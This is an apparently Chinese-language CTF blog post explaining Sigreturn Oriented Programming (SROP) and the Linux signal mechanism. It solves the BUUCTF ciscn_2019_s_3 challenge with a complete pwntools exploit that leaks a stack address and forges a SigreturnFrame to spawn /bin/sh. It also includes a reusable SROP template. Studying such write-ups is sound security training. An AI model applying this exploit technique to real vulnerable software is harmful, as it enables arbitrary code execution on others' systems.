@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"yw-by.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta property="og:type" content="article">
+<meta property="og:title" content="高级ROP-SROP">
+<meta property="og:url" content="http://yw-by.github.io/yw/3284650971/index.html">
+<meta property="og:site_name" content="yw__y">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yw-by.github.io/yw/3284650971/0.jpg">
+<meta property="og:image" content="http://yw-by.github.io/yw/3284650971/1.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/3284650971/2.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/3284650971/3.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/3284650971/4.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/3284650971/5.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/3284650971/6.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/3284650971/7.png">
+<meta property="og:image" content="http://yw-by.github.io/yw/3284650971/8.png">
+<meta property="article:published_time" content="2023-09-24T10:53:55.000Z">
+<meta property="article:modified_time" content="2023-09-27T09:59:46.661Z">
+<meta property="article:author" content="yw-by">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yw-by.github.io/yw/3284650971/0.jpg">
+
+
+<link rel="canonical" href="http://yw-by.github.io/yw/3284650971/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://yw-by.github.io/yw/3284650971/","path":"yw/3284650971/","title":"高级ROP-SROP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>高级ROP-SROP | yw__y</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">yw__y</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#signal%E6%9C%BA%E5%88%B6"><span class="nav-number">2.</span> <span class="nav-text">signal机制</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%A6%81%E6%B1%82"><span class="nav-number">4.</span> <span class="nav-text">攻击要求</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">5.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4%E5%92%8C%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="nav-number">5.1.</span> <span class="nav-text">查看保护和反编译</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99-bin-sh"><span class="nav-number">5.2.</span> <span class="nav-text">写&#x2F;bin&#x2F;sh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">5.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yw-by"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">yw-by</p>
+  <div class="site-description" itemprop="description">每天早起一点，或许我能赶上他们</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yw-by.github.io/yw/3284650971/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="yw-by">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yw__y">
+      <meta itemprop="description" content="每天早起一点，或许我能赶上他们">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="高级ROP-SROP | yw__y">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          高级ROP-SROP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-09-24 18:53:55" itemprop="dateCreated datePublished" datetime="2023-09-24T18:53:55+08:00">2023-09-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-09-27 17:59:46" itemprop="dateModified" datetime="2023-09-27T17:59:46+08:00">2023-09-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ROP/" itemprop="url" rel="index"><span itemprop="name">ROP</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ROP/%E9%AB%98%E7%BA%A7ROP/" itemprop="url" rel="index"><span itemprop="name">高级ROP</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><img src="/yw/3284650971/0.jpg" class>
+
+<span id="more"></span>
+
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>SROP(Sigreturn Oriented Programming) 于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究Framing Signals — A Return to Portable Shellcode发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。</p>
+<h1 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h1><p>signal机制是类unix系统中进程之间互相传递信息的一种方法，一般，我们也称其为软中断信号，或者软中断。比如许说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图：</p>
+<img src="/yw/3284650971/1.png" class>
+
+<ol>
+<li>内核向进程发送一个signal机制，该进程会被暂时挂起，进入内核态。</li>
+<li>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址。此时的栈结构如图，我们成ucontext（上下文）以及siginfo（信号信息）这一段为signal frame（信号帧）。需要注意的是，这一部分是在用户的地址空间的。之后会跳转到注册过的signal handler（信号处理程序）中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</li>
+</ol>
+<img src="/yw/3284650971/2.png" class>
+
+<p>不同的架构signal frame会有所不同</p>
+<ol start="3">
+<li>signal handler返回后，内核为执行sigreturn系统调用，为该程序恢复之前保存的上下文，其中包括将所有压入的寄存器重新pop回对应的寄存器，最后恢复程序的执行。其中32位的sigreturn的调用号为：199（0x77），64位的系统调用号为：15（0xf）。</li>
+</ol>
+<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>仔细回顾内核在signal信号处理的过程中的工作，我们能够发现内核主要的工作就是为进程保存上下文，之后恢复上下文。这些变动都在signal frame中。需要注意（为什么能攻击的原因）：</p>
+<ul>
+<li>signal fram被保存在用户的地址空间（栈）中，所以用户是可以读写的（我们能修改）</li>
+<li>内核和信号处理程序无关，它不会去记录这个signal对应的signal frame，所以当执行sigreturn系统调用时，此时的signal frame并不一定是之前内核为用户进程保存的signal frame。（没有检查机制）</li>
+</ul>
+<p>所以攻击者可以伪造一个signal frame用来获取shell</p>
+<h1 id="攻击要求"><a href="#攻击要求" class="headerlink" title="攻击要求"></a>攻击要求</h1><ul>
+<li>可以溢出并能控制内容的栈</li>
+<li>需要知道&#x2F;bin&#x2F;sh、signal frame、syscall、sigreturn的地址</li>
+<li>需要足够的空间存放signal frame</li>
+</ul>
+<p>pwntools已经集成了有关signalframe的函数，叫做SigreturnFrame函数</p>
+<p>它可以设置各寄存器的值（好厉害）</p>
+<p>从一个大佬那里找到的使用方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位</span></span><br><span class="line"><span class="comment"># sigreturn 代表可以触发sigreturn调用的地址</span></span><br><span class="line"><span class="comment"># 其gadgets如下，只要使rax = 0xf，然后进行系统调用</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x001 mov rax, 0Fh</span></span><br><span class="line"><span class="string">0x002 syscall</span></span><br><span class="line"><span class="string">0x003 ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">sigreturn = <span class="number">0x001</span></span><br><span class="line">syscall = <span class="number">0x002</span>  <span class="comment"># syscall gadget</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = sh_addr  <span class="comment"># &quot;/bin/sh\x00&quot;</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">pad = padding + <span class="built_in">bytes</span>(frame)  <span class="comment"># python3</span></span><br><span class="line">p.send(pad)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32位注意以下几个方面</span></span><br><span class="line"><span class="comment"># 1、上下文初始化</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line"><span class="comment"># frame = SigreturnFrame(kernel=&quot;i386&quot;)</span></span><br><span class="line"><span class="comment"># 2、frame.eax = xx  注意寄存器的名字</span></span><br><span class="line"><span class="comment"># 3、syscall指令在32位下可以找int 80</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>该题为buuctf的ciscn_2019_s_3</p>
+<h2 id="查看保护和反编译"><a href="#查看保护和反编译" class="headerlink" title="查看保护和反编译"></a>查看保护和反编译</h2><p>checksec</p>
+<img src="/yw/3284650971/3.png" class>
+
+<p>ida</p>
+<p>vuln函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看汇编</p>
+<img src="/yw/3284650971/4.png" class>
+
+<p>说一下汇编代码<br>xor rax, rax &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &gt; 将rax设置为0<br>mov edx, 400h&#x3D; &#x3D; &#x3D; &gt;将edx设置为0x400<br>lea rsi, [rsp+buf]&#x3D; &#x3D; &gt; 将buf参数的地址传入寄存器rsi<br>mov rdi, rax&#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &gt;将rax寄存器里的值（0）传入rdi寄存器（将rdi设置为0）<br>syscall &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &gt;进行系统调用<br>这段是执行了 read（0，buf，0x400）<br>下面的write也是一样<br>两个函数都是通过系统调用的方式实现<br>对于amd64程序sys_read 的调用号 为 0 ；sys_write 的调用号 为 1；stub_execve 的调用号 为 59；sys_rt_sigreturn调用号为15<br>这个题有两种解法</p>
+<p>这里说第二种SROP</p>
+<h2 id="写-bin-sh"><a href="#写-bin-sh" class="headerlink" title="写&#x2F;bin&#x2F;sh"></a>写&#x2F;bin&#x2F;sh</h2><p>这道题没有给我们&#x2F;bin&#x2F;sh，需要自己写</p>
+<p>write函数打印了0x30字节，而根据ida所写栈的大小只有0x18（包括ebp和返回地址），所以可以通过write函数打印出栈上的地址，再通过事先计算好的偏移获得写入的&#x2F;bin&#x2F;sh的地址（虽然地址会变但是偏移量不会）</p>
+<p>由vuln函数（汇编）中的 **lea     rsi, [rsp+buf]**可知，rsi记录了buf的地址。</p>
+<p>gdb调试（断点打在main函数的nop处，输入为aaaa）</p>
+<img src="/yw/3284650971/5.png" class>
+
+<p>可以看到rsi存入的地址为 0x7fffffffdf50 </p>
+<p>打印此处开始一段内容</p>
+<img src="/yw/3284650971/6.png" class>
+
+<p>注意这三行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdf50</span>:	<span class="number">0x00007f0a61616161</span>	<span class="number">0x0000000000400540</span><span class="comment">//前面是输入的aaaa</span></span><br><span class="line"><span class="number">0x7fffffffdf60</span>:	<span class="number">0x00007fffffffdf80</span>	<span class="number">0x0000000000400536</span></span><br><span class="line"><span class="number">0x7fffffffdf70</span>:	<span class="number">0x00007fffffffe078</span>	<span class="number">0x0000000100000000</span><span class="comment">//到前面已经是0x28（40）个字节了，每串是8字节</span></span><br></pre></td></tr></table></figure>
+
+<p>且</p>
+<img src="/yw/3284650971/7.png" class>
+
+<p>所以他是在栈上的（最左边的黄色地址是栈的地址，指向的地址是栈地址储存的内容），因此可以利用它来获取&#x2F;bin&#x2F;sh的地址</p>
+<p>计算它到buf的偏移（buf即我们输入的内容的地址）</p>
+<img src="/yw/3284650971/8.png" class>
+
+<p>得到偏移量是0x128，但是远程是0x118，因为环境不同，libc版本不同，需要改题目文件的libc的版本（但是我改完运行不了了）</p>
+<p>0x00007fffffffe068之前有0x20个字节，在接收地址时要先把他们过滤掉。<br>再计算它到输入内容的偏移</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,26790)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">read_write_addr=<span class="number">0x4004F1</span><span class="comment">#这里，并不是vuln函数的起始地址，而是跳过存入原rsp的地址（自认为的原因</span></span><br><span class="line">sigreturn_addr=<span class="number">0x4004DA</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">mov_call_addr=<span class="number">0x400580</span></span><br><span class="line">syscall_addr=<span class="number">0x400501</span></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(read_write_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">bin_sh_addr=u64(io.recv(<span class="number">8</span>))-<span class="number">0x128</span><span class="comment">#本地</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=constants.SYS_execve</span><br><span class="line">frame.rdi=bin_sh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(sigreturn_addr)+p64(syscall_addr)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>上面有vuln的汇编</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>yw-by
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://yw-by.github.io/yw/3284650971/" title="高级ROP-SROP">http://yw-by.github.io/yw/3284650971/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/yw/705232397/" rel="prev" title="中级ROP之ret2_csu_init">
+                  <i class="fa fa-chevron-left"></i> 中级ROP之ret2_csu_init
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/yw/1433919170/" rel="next" title="堆利用入门">
+                  堆利用入门 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">yw-by</span>
+  </div>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+-->
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
